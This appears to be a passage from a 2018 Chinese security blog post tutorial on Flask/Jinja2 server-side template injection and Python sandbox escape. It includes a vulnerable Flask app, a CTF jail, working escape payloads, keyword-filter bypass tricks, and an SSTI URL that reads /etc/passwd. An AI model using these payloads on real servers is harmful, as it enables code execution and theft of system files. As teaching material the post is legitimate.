@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          Flask/Jinja2 SSTI &amp;&amp; python 沙箱逃逸 - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2018/06/Flask-Jinja2-SSTI-python-沙箱逃逸/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#python" title="python">python</a>
+                        
+                          <a class="tag" href="/tags/#Flask" title="Flask">Flask</a>
+                        
+                          <a class="tag" href="/tags/#沙箱逃逸" title="沙箱逃逸">沙箱逃逸</a>
+                        
+                    </div>
+                    <h1>Flask/Jinja2 SSTI &amp;&amp; python 沙箱逃逸</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2018-06-25
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>想着之前学了Flask,就正好把之前的SSTI模板注入，和python沙箱逃逸一起给学了<br>虽然模板注入和沙箱逃逸是两码事，但是由于jinja2的python运行环境也是一个沙箱，就会涉及到到一些沙箱逃逸的东西<br>而且沙箱逃逸也不仅仅只有在SSTI中发挥作用，所以虽然写在一起，但沙箱逃逸可能还会占一块比较大而独立的部分  </p>
+<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p>SSTI，又称服务端模板注入攻击。其发生在MVC框架中的view层。</p>
+<blockquote>
+<p>服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题</p>
+</blockquote>
+<p>先来看一段flask代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, config</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/&lt;name&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(name)</span>:</span></span><br><span class="line">	template = <span class="string">'&lt;h1&gt;hello &#123;&#125;!&lt;h1&gt;'</span>.format(name)</span><br><span class="line">	<span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure></p>
+<p>就是一个简单的欢迎页面，以一个字符串当作html模板返回给客户端，其中用format格式化的用户的输入，并插入在模板中<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive//Flask-Jinja2-SSTI-python-沙箱逃逸/1.png" alt><br>接下来来看看输入<code>1</code>时的输出<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive//Flask-Jinja2-SSTI-python-沙箱逃逸/2.png" alt><br>可以看到，用户的输入被插入到模板中，然后被jinja2语法解释器解析。返回了解析后的结果。  </p>
+<p>由于jinja2在设计时就限制了不能执行过多的python语句，而且运行环境也是在一个沙箱中，以保证安全。<br>jinja2的沙箱逃逸先后面再说，这里我们可以先获取一些flask运行时的数据<br>如运行session的值（虽然这里暂时没有session）<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive//Flask-Jinja2-SSTI-python-沙箱逃逸/3.png" alt><br>还有一些flask中的配置变量<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive//Flask-Jinja2-SSTI-python-沙箱逃逸/4.png" alt>  </p>
+<p>简而言之，就相当于控制了对方的view层，可以获取到一切jinja2中可以获取的数据<br>但假如能逃逸jinja2的沙箱，就可能不仅仅只有那么点危害了..  </p>
+<h1 id="python沙箱逃逸"><a href="#python沙箱逃逸" class="headerlink" title="python沙箱逃逸"></a>python沙箱逃逸</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>python沙箱逃逸主要是用于一些沙箱环境，如一些OJ或者一些在线交互终端，以及jinja2这种python模板解释器  </p>
+<p>沙箱一般是限制指定函数的运行，或者对指定模块的删除以及过滤  </p>
+<p>沙箱逃逸就是要逃离这种限制，让对方服务器运行我们指定的恶意代码，以达到getshell或者文件读取的目的</p>
+<p>最后，这里的python沙箱逃逸用的是python2.7，python3可能有所不同  </p>
+<h2 id="一些任意代码执行以及文件读取的函数"><a href="#一些任意代码执行以及文件读取的函数" class="headerlink" title="一些任意代码执行以及文件读取的函数"></a>一些任意代码执行以及文件读取的函数</h2><p><strong>os</strong> 执行系统命令<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">'ipconfig'</span>)</span><br></pre></td></tr></table></figure></p>
+<p><strong>exec</strong>  任意代码执行<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(<span class="string">'__import__("os").system("ipconfig")'</span>)</span><br></pre></td></tr></table></figure></p>
+<p><strong>eval</strong>  任意代码执行<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(<span class="string">'__import__("os").system("ipconfig")'</span>)</span><br></pre></td></tr></table></figure></p>
+<p><strong>timeit</strong>  本是检测性能的，也可以任意代码执行<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">"__import__('os').system('ipconfig')"</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p>
+<p><strong>platform</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">platform.popen(<span class="string">'ipconfig'</span>).read()</span><br></pre></td></tr></table></figure></p>
+<p><strong>subprocess</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.Popen(<span class="string">'ipconfig'</span>, shell=<span class="literal">True</span>, stdout=subprocess.PIPE,stderr=subprocess.STDOUT).stdout.read()</span><br></pre></td></tr></table></figure></p>
+<p><strong>file</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file(<span class="string">'/etc/passwd'</span>).read()</span><br></pre></td></tr></table></figure></p>
+<p><strong>open</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(<span class="string">'/etc/passwd'</span>).read()</span><br></pre></td></tr></table></figure></p>
+<p><strong>codecs</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line">codecs.open(<span class="string">'/etc/passwd'</span>).read()</span><br></pre></td></tr></table></figure></p>
+<h2 id="一道ctf"><a href="#一道ctf" class="headerlink" title="一道ctf"></a>一道ctf</h2><p>不如先来看一道网上找到的ctf题，来熟悉下经典的逃逸方式<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line">banned = [</span><br><span class="line">    <span class="string">"import"</span>,</span><br><span class="line">    <span class="string">"exec"</span>,</span><br><span class="line">    <span class="string">"eval"</span>,</span><br><span class="line">    <span class="string">"pickle"</span>,</span><br><span class="line">    <span class="string">"os"</span>,</span><br><span class="line">    <span class="string">"subprocess"</span>,</span><br><span class="line">    <span class="string">"kevin sucks"</span>,</span><br><span class="line">    <span class="string">"input"</span>,</span><br><span class="line">    <span class="string">"banned"</span>,</span><br><span class="line">    <span class="string">"cry sum more"</span>,</span><br><span class="line">    <span class="string">"sys"</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">targets = __builtins__.__dict__.keys()</span><br><span class="line">targets.remove(<span class="string">'raw_input'</span>)</span><br><span class="line">targets.remove(<span class="string">'print'</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> targets:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[x]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    print(<span class="string">"&gt;&gt;&gt;"</span>, end=<span class="string">' '</span>)</span><br><span class="line">    data = raw_input()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> banned:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> data.lower():</span><br><span class="line">            print(<span class="string">"No bueno"</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment"># this means nobreak</span></span><br><span class="line">        <span class="keyword">exec</span> data</span><br></pre></td></tr></table></figure></p>
+<p>删除了内置函数，以及禁止了指定字符的出现<br>不妨先来看下payload<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">40</span>](<span class="string">'flag.txt'</span>).read()</span><br></pre></td></tr></table></figure></p>
+<p>先通过<code>__class__</code>获取列表的类<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;[].__class__</span><br><span class="line">&lt;type <span class="string">'list'</span>&gt;</span><br></pre></td></tr></table></figure></p>
+<p>再通过<code>__base__</code>获取基础类 object类（在python2.7中大部分类都继承了object类）<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__</span><br><span class="line">&lt;type <span class="string">'object'</span>&gt;</span><br></pre></td></tr></table></figure></p>
+<p>依次获取子类列表<code>__subclasses__()</code><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()</span><br><span class="line">[&lt;type 'type'&gt;, &lt;type 'weakref'&gt;, &lt;type 'weakcallableproxy'&gt;, &lt;type 'weakproxy'&gt;, &lt;type 'int'&gt;, &lt;type 'basestring'&gt;, &lt;type 'bytearray'&gt;, &lt;type 'list'&gt;, &lt;type 'NoneType'&gt;, &lt;type 'NotImplementedType'&gt;, &lt;type 'traceback'&gt;, &lt;type 'super'&gt;, &lt;type 'xrange'&gt;, &lt;type 'dict'&gt;, &lt;type 'set'&gt;, &lt;type 'slice'&gt;, &lt;type 'staticmethod'&gt;, &lt;type 'complex'&gt;, &lt;type 'float'&gt;, &lt;type 'buffer'&gt;, &lt;type 'long'&gt;, &lt;type 'frozenset'&gt;, &lt;type 'property'&gt;, &lt;type 'memoryview'&gt;, &lt;type 'tuple'&gt;, &lt;type 'enumerate'&gt;, &lt;type 'reversed'&gt;, &lt;type 'code'&gt;, &lt;type 'frame'&gt;, &lt;type 'builtin_function_or_method'&gt;, &lt;type 'instancemethod'&gt;, &lt;type 'function'&gt;, &lt;type 'classobj'&gt;, &lt;type 'dictproxy'&gt;, &lt;type 'generator'&gt;, &lt;type 'getset_descriptor'&gt;, &lt;type 'wrapper_descriptor'&gt;, &lt;type 'instance'&gt;, &lt;type 'ellipsis'&gt;, &lt;type 'member_descriptor'&gt;, &lt;type 'file'&gt;, &lt;type 'PyCapsule'&gt;, &lt;type 'cell'&gt;, &lt;type 'callable-iterator'&gt;, &lt;type 'iterator'&gt;, &lt;type 'sys.long_info'&gt;, &lt;type 'sys.float_info'&gt;, &lt;type 'EncodingMap'&gt;, &lt;type 'fieldnameiterator'&gt;, &lt;type 'formatteriterator'&gt;, &lt;type 'sys.version_info'&gt;, &lt;type 'sys.flags'&gt;, &lt;type 'sys.getwindowsversion'&gt;, &lt;type 'exceptions.BaseException'&gt;, &lt;type 'module'&gt;, &lt;type 'imp.NullImporter'&gt;, &lt;type 'zipimport.zipimporter'&gt;, &lt;type 'nt.stat_result'&gt;, &lt;type 'nt.statvfs_result'&gt;, &lt;class 'warnings.WarningMessage'&gt;, &lt;class 'warnings.catch_warnings'&gt;, &lt;class '_weakrefset._IterationGuard'&gt;, &lt;class '_weakrefset.WeakSet'&gt;, &lt;class '_abcoll.Hashable'&gt;, &lt;type 'classmethod'&gt;, &lt;class '_abcoll.Iterable'&gt;, &lt;class '_abcoll.Sized'&gt;, &lt;class '_abcoll.Container'&gt;, &lt;class '_abcoll.Callable'&gt;, &lt;type 'dict_keys'&gt;, &lt;type 'dict_items'&gt;, &lt;type 'dict_values'&gt;, &lt;class 'site._Printer'&gt;, &lt;class 'site._Helper'&gt;, &lt;type '_sre.SRE_Pattern'&gt;, &lt;type '_sre.SRE_Match'&gt;, &lt;type '_sre.SRE_Scanner'&gt;, &lt;class 'site.Quitter'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;, &lt;type 'operator.itemgetter'&gt;, &lt;type 'operator.attrgetter'&gt;, &lt;type 'operator.methodcaller'&gt;, &lt;type 'functools.partial'&gt;, &lt;type 'MultibyteCodec'&gt;, &lt;type 'MultibyteIncrementalEncoder'&gt;, &lt;type 'MultibyteIncrementalDecoder'&gt;, &lt;type 'MultibyteStreamReader'&gt;, &lt;type 'MultibyteStreamWriter'&gt;, &lt;class 'string.Template'&gt;, &lt;class 'string.Formatter'&gt;]</span><br></pre></td></tr></table></figure></p>
+<p>这样就找了更多可以拓展的类，就更方便于我们找到我们想要执行的函数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()[<span class="number">40</span>]</span><br><span class="line">&lt;type <span class="string">'file'</span>&gt;</span><br></pre></td></tr></table></figure></p>
+<p>第四十个索引恰好是想要的file类型，就可以用它进行文件读取了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()[<span class="number">40</span>](<span class="string">'d:/1.txt'</span>).read()</span><br><span class="line"><span class="string">'hello world!'</span></span><br></pre></td></tr></table></figure></p>
+<p>再让我们来看下另一个命令执行的payload<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure></p>
+<p>前面一部分思路类似于之前文件读取的思路，就直接来到这里<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">warnings</span>.<span class="title">WarningMessage</span>'&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>可以看到是获取了一个warnings.WarningMessage类，然后继续执行<code>__init__</code>后获取全局变量</p>
+<blockquote>
+<p>func_globals返回一个包含函数全局变量的字典引用  </p>
+</blockquote>
+<p>然后获取linecache模块（其中包含了os模块）<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>]</span><br><span class="line">&lt;module <span class="string">'linecache'</span> <span class="keyword">from</span> <span class="string">'D:\Python\Python27\lib\linecache.pyc'</span>&gt;</span><br></pre></td></tr></table></figure></p>
+<p>然后用<code>__dict__</code>获取指定模块（由于对输入的字符进行了限制，所以要找个利用字符串获取指定模块的方式）</p>
+<blockquote>
+<p>__dict__是一个字典，键为属性名，值为属性值  </p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].__dict__[<span class="string">'os'</span>]</span><br><span class="line">&lt;module <span class="string">'os'</span> <span class="keyword">from</span> <span class="string">'D:\Python\Python27\lib\os.pyc'</span>&gt;</span><br></pre></td></tr></table></figure>
+<p>成功获取到了os模块，然后命令执行即可<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure></p>
+<h2 id="逃逸思路"><a href="#逃逸思路" class="headerlink" title="逃逸思路"></a>逃逸思路</h2><p>当函数被禁用时，就要通过一些类中的关系来引用被禁用的函数  </p>
+<p>一些常见的寻找特殊模块的方式</p>
+<ul>
+<li><strong>__class__</strong>:获得当前对象的类</li>
+<li><strong>__bases__</strong>:列出其基类  </li>
+<li><strong>__mro__</strong> :列出解析方法的调用顺序，类似于bases</li>
+<li><strong>__subclasses__()</strong>：返回子类列表</li>
+<li><strong>__dict__</strong> ： 列出当前属性/函数的字典</li>
+<li><strong>func_globals</strong>返回一个包含函数全局变量的字典引用</li>
+</ul>
+<h2 id="一些防御与对抗措施"><a href="#一些防御与对抗措施" class="headerlink" title="一些防御与对抗措施"></a>一些防御与对抗措施</h2><h3 id="禁止引入敏感包"><a href="#禁止引入敏感包" class="headerlink" title="禁止引入敏感包"></a>禁止引入敏感包</h3><p>比如通过正则匹配之类的，拒绝<code>import os</code>、<code>import commands</code>之类的语句出现<br>这是最低级的一种防御措施，可以通过一些编码来进行混淆  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f3ck = __import__(<span class="string">"pbzznaqf"</span>.decode(<span class="string">'rot_13'</span>))</span><br><span class="line"><span class="keyword">print</span> f3ck.getoutput(<span class="string">'ifconfig'</span>)</span><br></pre></td></tr></table></figure>
+<p>或者配合<code>getattr</code>函数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line">getattr(os,codecs.encode(<span class="string">"flfgrz"</span>,<span class="string">'rot13'</span>))(<span class="string">'ifconfig'</span>)</span><br></pre></td></tr></table></figure></p>
+<p>或者进行一些base64,倒序之类的。<br>总之，只要找到一个以字符形式执行代码的总是会有办法的</p>
+<h3 id="删除-builtins-中的函数"><a href="#删除-builtins-中的函数" class="headerlink" title="删除__builtins__中的函数"></a>删除__builtins__中的函数</h3><p>就比如之前那个ctf例子中的<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> targets:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[x]</span><br></pre></td></tr></table></figure></p>
+<p>可以通过reload重新导入<code>__builtins__</code>模块<code>reload(__builtin__)</code>  </p>
+<p>reload也是<code>__builtins__</code>中的一个函数，假如它也被删了的话，还可以尝试一个imp的模块<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> imp</span><br><span class="line">imp.reload(__builtin__)</span><br></pre></td></tr></table></figure></p>
+<h3 id="修改sys-modules"><a href="#修改sys-modules" class="headerlink" title="修改sys.modules"></a>修改sys.modules</h3><p>由于import导入包时，是从sys.path中去导入对应的包<br>防御者可能会对其进行修改，导致无法导入想要的模块  </p>
+<p>这时可以自己尝试修改模块的位置<code>sys.modules[&#39;os&#39;]=&#39;/usr/lib/python2.7/os.py&#39;</code><br>或者尝试运行一遍<code>os.py</code>，也就相当于导入了一次os模块<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execfile(<span class="string">'/usr/lib/python2.7/os.py'</span>)</span><br></pre></td></tr></table></figure></p>
+<h3 id="寻找数据链"><a href="#寻找数据链" class="headerlink" title="寻找数据链"></a>寻找数据链</h3><p>大多数情况下时，可以尝试利用类似之前的payload，通过类之间的关系，寻找对应的数据链<br>然后找到你想要的函数引用，就可以进行命令执行了</p>
+<h1 id="Jinja2中的沙箱逃逸"><a href="#Jinja2中的沙箱逃逸" class="headerlink" title="Jinja2中的沙箱逃逸"></a>Jinja2中的沙箱逃逸</h1><p>沙箱逃逸讲完了，就再回来看看如何逃逸Jinja2的沙箱<br>和之前环境类似<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">	name = request.args.get(<span class="string">'name'</span>)</span><br><span class="line">	template = <span class="string">'&lt;h1&gt;hello &#123;&#125;!&lt;h1&gt;'</span>.format(name)</span><br><span class="line">	<span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure></p>
+<p>环境依旧是2.7，利用之前那个payload，我们很容易就能进行任意文件读取<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.5.128:5000/&#123;&#123; [<span class="string"></span>].<span class="strong">__class__</span>.<span class="strong">__base__</span>.<span class="strong">__subclasses__</span>()[<span class="string">40</span>](<span class="link">'/etc/passwd'</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive//Flask-Jinja2-SSTI-python-沙箱逃逸/5.png" alt>  </p>
+<p>但，其实能做的远不止这些  </p>
